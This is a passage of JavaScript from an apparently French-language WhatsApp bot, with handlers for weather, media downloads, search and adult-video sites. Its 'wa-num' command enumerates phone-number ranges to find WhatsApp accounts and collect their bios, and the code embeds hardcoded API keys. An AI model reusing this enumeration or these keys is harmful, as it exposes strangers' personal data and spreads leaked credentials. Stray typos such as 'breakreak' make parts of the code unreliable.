           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			case 'meteo':{
if (!text) return replygckev('Quelle Localitey?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Meteo de  ${text}*\n\n`
            textw += `*Meteo:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pression:-* ${wdata.data.main.pressure}\n`
            textw += `*Humiditey:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Pays:-* ${wdata.data.sys.country}\n`

           Kev.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break
           case 'happymod':{
if (!q) return replygckev(`Exemple ${prefix+command} Sufway surfer mod`)
await KevStickWait()
let kat = await scp2.happymod(q)
replygckev(util.format(kat))
}
break
case 'gdrive': {
		if (!args[0]) return replygckev(`Veuillez entrer votre lien Google`)
	await KevStickWait()
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await replygckev(`
≡ *Google Drive DL*
▢ *Nom:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	Kev.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	replygckev('Erreur: Verifiez votre lien ou envoyez en un autre') 
  }
}
break
           case 'git': case 'gitclone':
if (!args[0]) return replygckev(`Ou est le lien?\nExemple :\n${prefix}${command} https://github.com/kenvofc/kenvofc`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygckev(`Lien invalide!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    Kev.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygckev(mess.error))
break
           case 'spotify':{
	if (!text) return replygckev(`*Veuillez entrer le titre*`)
    try {
        const apiUrl = `https://www.guruapi.tech/api/spotifyinfo?text=${encodeURIComponent(text)}`
        const response = await fetch(apiUrl);
        if (!response.ok) {
            console.log('Error searching for song:', response.statusText)
            return replygckev('musique introuvable')
        }
        const data = await response.json()
        const coverimage = data.spty.results.thumbnail
        const name = data.spty.results.title
        const slink = data.spty.results.url
        const dlapi = `https://www.guruapi.tech/api/spotifydl?text=${encodeURIComponent(text)}`
        const audioResponse = await fetch(dlapi)
        if (!audioResponse.ok) {
            console.log('Error fetching audio:', audioResponse.statusText)
            return replygckev('erreur')
        }
        const audioBuffer = await audioResponse.buffer()
        const tempDir = os.tmpdir()
        const audioFilePath = path.join(tempDir, 'audio.mp3')
        try {
            await fs.promises.writeFile(audioFilePath, audioBuffer)
        } catch (writeError) {
            console.error('Error writing audio file:', writeError)
            return replygckev( 'Erreur')
        }
        let doc = {
            audio: {
              url: audioFilePath
            },
            mimetype: 'audio/mpeg',
            ptt: true,
            waveform:  [100, 0, 100, 0, 100, 0, 100],
            fileName: "kenvofc",
            contextInfo: {
              mentionedJid: [m.sender],
              externalAdReply: {
                title: `PLAYING TO ${name}`,
                body: botname,
                thumbnailUrl: coverimage,
                sourceUrl: websitex,
                mediaType: 1,
                renderLargerThumbnail: true
              }
            }
        }        
        await Kev.sendMessage(m.chat, doc, { quoted: m })
    } catch (error) {
        console.error('Error fetching Spotify data:', error)
        return replygckev('*Erreur*')
    }
    }
    break
			case 'mediafire': {
  	if (!args[0]) return replygckev(`Veuillez entrer le lien mediafire apre la commande`)
    if (!args[0].match(/mediafire/gi)) return replygckev(`Lien incorrect`)
    const { mediafiredl } = require('@bochilteam/scraper')
    let full = /f$/i.test(command)
    let u = /https?:\/\//.test(args[0]) ? args[0] : 'https://' + args[0]
    let res = await mediafiredl(args[0])
    let { url, url2, filename, ext, aploud, filesize, filesizeH } = res
    let caption = `
   ≡ *MEDIAFIRE*

▢ *Numero:* ${filename}
▢ *Size:* ${filesizeH}
▢ *Extension:* ${ext}
▢ *Uploaded:* ${aploud}
`.trim()
    Kev.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext }, { quoted : m })
    }
    break
			case 'remini': {
			if (!quoted) return replygckev(`La photo?`)
			if (!/image/.test(mime)) return replygckev(`Veuillez repondre a une image ${prefix + command}`)
			await KevStickWait()
			const { remini } = require('./bibliotheque/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: proses }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😍\",\"id\":\""}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
			}
			break
			case 'imdb':
if (!text) return replygckev(`_Nom du film ou de la serie`)
await KevStickWait()
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Titre      : " + fids.data.Title + "\n"
            imdbt += "📅Annee       : " + fids.data.Year + "\n"
            imdbt += "⭐ Evaluation      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Directeur   : " + fids.data.Director + "\n"
            imdbt += "✍Scenarist     : " + fids.data.Writer + "\n"
            imdbt += "👨Acteurs     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Langue   : " + fids.data.Language + "\n"
            imdbt += "🌍Pays    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
           Kev.sendMessage(m.chat, {
                image: {
                    url: fids.data.Poster,
                },
                caption: imdbt,
            }, {
                quoted: m,
            })
            break
            case 'itunes': {
if (!text) return replygckev('Veuillez entrer le titre')
  try {
    let res = await fetch(`https://api.popcat.xyz/itunes?q=${encodeURIComponent(text)}`)
    if (!res.ok) {
      throw new Error(`API request failed with status ${res.status}`)
    }
    let json = await res.json()
    console.log('JSON response:', json)
    let songInfo = 
    `*Song Information:*\n
     • *Nom:* ${json.name}\n
     • *Artist:* ${json.artist}\n
     • *Album:* ${json.album}\n
     • * Date:* ${json.release_date}\n
     • *Prix:* ${json.price}\n
     • *Length:* ${json.length}\n
     • *Genre:* ${json.genre}\n
     • *URL:* ${json.url}`
    // Check if thumbnail is present, then send it with songInfo as caption
    if (json.thumbnail) {
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: songInfo
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({image: {url:json.thumbnail}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Mbieng  ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
    } else {
      replygckev(songInfo)
    }
  } catch (error) {
    console.error(error)
  }
}
break
            case 'lyrics': {
if (!text) return replygckev(`Veuillez entrer un titre\nExemple usage: ${prefix}lyrics Thunder`)
await KevStickWait()
const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
try {
const result = await lyricsv2(text).catch(async _ => await lyrics(text))
const xeonlirik = `
*Titre :* ${result.title}
*Auteur :* ${result.author}
*Url :* ${result.link}

*Lyrics :* ${result.lyrics}

`.trim()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xeonlirik
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}catch{
replygckev(`Lyrics ${text} not found!`)
}
}
break
            case 'ami':
case 'searchfriend':{
await KevStickWait()
let teman = pickRandom(kevverifieduser)
setTimeout(() => {
}, 1000)
setTimeout(() => {
replygckev('Debrouille toi')
}, 5000)
setTimeout(() => {
Kev.sendMessage(m.chat, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break
            case 'wa-num': case 'num-wa': case 'searchno': case 'searchnumber':{
           	if (!text) return replygckev(`Veuillez entrer un numero incomplet se terminant par  x\n\nExemple: ${prefix + command} 23765677451x`)
var inputnumber = text.split(" ")[0]
        
        replygckev(`Recherche d un compte WhatsApp dans la rangey recommandee...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await Kev.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await Kev.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🍁 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Africa/Abidjan').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        replygckev(`${text66}${nobio}${nowhatsapp}`)
        }
break
			case 'sticker-recherche': {
if (!text) return replygckev(`Exemple : ${m.prefix + command} kururmi`)
var js = await fetch(`https://dikaardnt.com/api/search/sticker?q=${q}`)
var json = await js.json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `
❗ Note : Sylvers MD donnera un resultat aleatoire. Si le resultat ne satisfait pas vos attentes vous pouvez reesayer ${prefix + command} ${text}

💼 Titre : ${json[0].title}
🔗 Lien : ${json[0].url}
⭐ Total : ${json[0].total}
`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
}
break
			case 'recherche-apk': {
if (!text) return replygckev(`Exemple : ${prefix + command} whatsapp`)
var js = await fetch(`https://dikaardnt.com/api/search/apk?q=${q}`)
var json = await js.json()
var capt = `
❗ Note : Sylvers MD donnera un resultat aleatoire. Si le resultat ne satisfait pas vos attentes vous pouvez reesayer ${prefix + command} ${text}
    
💼 Titre : ${json[0].package}
🔗 Lien : ${json[0].url}
👤 Developpeur : ${json[0].developer}
⭐ Rating : ${json[0].rating}
`;
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: capt
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: json[0].thumbnail }}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'voir-plus': {
	let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
    Kev.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break;
			case 'xvideodl': case 'xvideo-search': case 'xvideo': case 'xvideos': case 'xvideosdl': {
	if (!m.isGroup) return KevStickGroup()
	if (!AntiNsfw) return replygckev(mess.nsfw)
  if (!text) return replygckev(`Que voulez vous chercher?\nUsage: *${prefix + command} <search>*\n\nExemple: ${prefix+command} Baise derriere l'amphi\Vous pouvez egalement utiliser un lien\nExemple: ${prefix+command} lien*`);
    if (!text) return replygckev('Veuillez entrer une recherche ou un lien valide.');
    // Check if the input is a valid Xvideos URL
    const isURL = /^(https?:\/\/)?(www\.)?xvideos\.com\/.+$/i.test(text);
   try {
      if (isURL) {
        // If it's a valid URL, directly download the video
        const result = await xvideosdl(text);
        const { title, url } = result.result; 
        // Send the video file
        const response = await fetch(url);
        const buffer = await response.arrayBuffer();
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `We The Best!!!!\nTitre: ${title}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: Buffer.from(buffer)}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂💦\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
      } else {
        // If it's not a valid URL, perform a search and display the search results
        const results = await xvideosSearch(text);
        if (results.length === 0) {
          replygckev('Recherche introuvable, veuillez entrer un texte valide.');
        } else {
          const searchResults = results.map((result, index) => {
            return `${index + 1}. *${result.title}*\nDuree: ${result.duration}\nQualitey: ${result.quality}\nURL: ${result.url}`;
          }).join('\n\n');  
          let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*Recherche du resultat de "${text}":*\n\n${searchResults}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
        }
      }
    } catch (error) {
      console.error(error);
      return replygckev('impossible de trouver les informations de cette video peu recommandable.');
    }
  };
  break
  case 'xnxxdl': case 'xnxx': case 'xnxxsearch': {
  if (!m.isGroup) return KevStickGroup()
	if (!AntiNsfw) return replygckev(mess.nsfw)
  if (!text)
    return replygckev(`Que voulez vous chercher?\nUsage: *${prefix + command} <search>*\n\nExemple: Baise derriere l'amphi\Vous pouvez egalement utiliser un lien\nExemple: .${prefix + command} lien *`)
  let url
  try {
    url = new URL(text)
  } catch (error) {
    url = null
  }
  if (url) {
    try {
      const files = await xnxxdl(url.href)
      if (files && files.high) {
      	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `We The Best!!!!`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: {url: files.high}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂💦\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
        Kev.sendMessage(m.chat, {video:{url: files.high}, caption: 'We The Best!!'}, {quoted:m})
      } else {
        replygckev('🔴 Erreur: Chargement interrompu.')
      }
    } catch (e) {
      console.error(e)
      replygckev('🔴 Erreur: Nous rencontrons des problemes a poursuivre votre requete.')
    }
  } else {
    try {
      const results = await xnxxSearch(text)
      if (results.length > 0) {
        const message = results.map((r, i) => `${i + 1}. [${r.title}](${r.link})`).join('\n')
        let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: message
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😂\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionJid: Kev.parseMention(message),
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
      } else {
        replygckev('🔴 Erreur: Resultat introuvable.')
      }
    } catch (e) {
      console.error(e)
      replygckev('🔴 Erreur: Nous rencontrons un problem a poursuivre votre requete.')
    }
  }
}
breakreak
			case 'yts': case 'recherche-youtube': {
  if (!text) return replygckev(`*Exemple :* ${prefix + command} titre`);
  try {
let yts = require("yt-search")
    let search = await yts(text);
    let videos = search.all;
    console.log(videos)
    if (!videos || videos.length === 0) {
      replygckev('Video introuvable');
      return;
    }
    // Choose between 1 and 5 videos at random
    const numVideos = Math.min(videos.length, Math.floor(Math.random() * 10) + 1);
    const selectedVideos = [];
    while (selectedVideos.length < numVideos) {
      const randomIndex = Math.floor(Math.random() * videos.length);
      const randomVideo = videos.splice(randomIndex, 1)[0]; // Avoid selecting the same videos
      selectedVideos.push(randomVideo);
    }
    let push = [];
    for (let i = 0; i < selectedVideos.length; i++) {
      let video = selectedVideos[i];
      let cap = `Titre : ${video.title}`;
      const mediaMessage = await prepareWAMessageMedia({ image: { url: video.thumbnail } }, { upload: Kev.waUploadToServer });
      push.push({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: cap
        }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          title: `Video ${i + 1}`,
          subtitle: '',
          hasMediaAttachment: true,
          ...mediaMessage
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [
            {
              "name": "cta_copy",
              "buttonParamsJson": `{"display_text":"Copy Url","id":"1234","copy_code":"${video.url}"}`
            }
          ]
        })
      });
    }
    const msg = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({
              text: ownername
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: botname
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: push
            }),
            contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
          })
        }
      }
    }, {quoted:m});
    await Kev.relayMessage(m.chat, msg.message, {
      messageId: msg.key.id
    });
  } catch (e) {
    console.error(e);
    await replygckev(`Erreur`);
  }
}
break
			case 'wikipedia': case 'wiki': {
	if (!text) return replygckev(`Veuillez entrer l objet de votre recherche Wikipedia`)
	
    try {
	const link =  await axios.get(`https://en.wikipedia.org/wiki/${text}`)
	const $ = cheerio.load(link.data)
	let wik = $('#firstHeading').text().trim()
	let resulw = $('#mw-content-text > div.mw-parser-output').find('p').text().trim()
	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `▢ *Wikipedia*

‣ Titre : ${wik}

${resulw}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
} catch (e) {
  replygckev('⚠️ Recherche introuvable')
}
}
break
			case 'google': {
if (!q) return replygckev(`Exemple : ${prefix + command} ${botname}`)
await KevStickWait()
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Titre* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Lien* : ${g.link}\n\n────────────────────────\n\n`
} 
replygckev(teks)
})
}
break
			case 'getjoUSDequest':{
	if (!m.isGroup) return KevStickGroup()
	if (!m.isBotAdmin) return KevStickBotAdmin()
if (!m.isAdmin && !TontonKev) return KevStickAdmin()
	const response = await Kev.groupRequestParticipantsList(m.chat);
  if (!response || !response.length) {
    Kev.sendMessage(m.chat, {text: 'No pending join requests. ✅'}, {quoted:m});
    return;
  }
  let replyMessage = `${themeemoji} Join Request List:\n`;
  response.forEach((request, index) => {
    const { jid, request_method, request_time } = request;
    const formattedTime = new Date(parseInt(request_time) * 1000).toLocaleString();
    replyMessage += `\n*No.: ${index + 1} Request Details. 👇*`;
    replyMessage += `\n🧟‍♂️ *JID:* ${jid}`;
    replyMessage += `\n🧪 *Method:* ${request_method}`;
    replyMessage += `\n⏰ *Time:* ${formattedTime}\n`;
  });

  Kev.sendMessage(m.chat, {text: replyMessage}, {quoted:m});
};
break
